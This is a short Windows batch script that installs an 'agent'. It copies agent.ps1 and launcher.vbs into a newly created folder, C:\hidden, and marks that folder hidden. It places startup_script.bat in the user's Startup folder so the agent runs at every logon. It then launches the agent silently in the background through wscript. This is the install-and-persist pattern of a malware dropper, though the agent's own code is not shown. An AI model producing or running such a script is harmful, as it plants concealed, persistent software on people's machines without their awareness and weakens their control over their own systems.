@echo off
cd /d %~dp0
set "destination_folder=C:\"

if exist "agent.ps1" (
    mkdir "%destination_folder%\hidden\"
    attrib +h "%destination_folder%\hidden"
    copy "agent.ps1" "%destination_folder%\hidden\"
    copy "launcher.vbs" "%destination_folder%\hidden\"
    echo File copied successfully to %destination_folder%\hidden\.
)
set "destination_folder=%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "startup_script.bat" (
    copy "startup_script.bat" "%destination_folder%"
    echo File copied successfully to %destination_folder%.
)
echo Launching agent.

start /B wscript "C:\hidden\launcher.vbs"

pause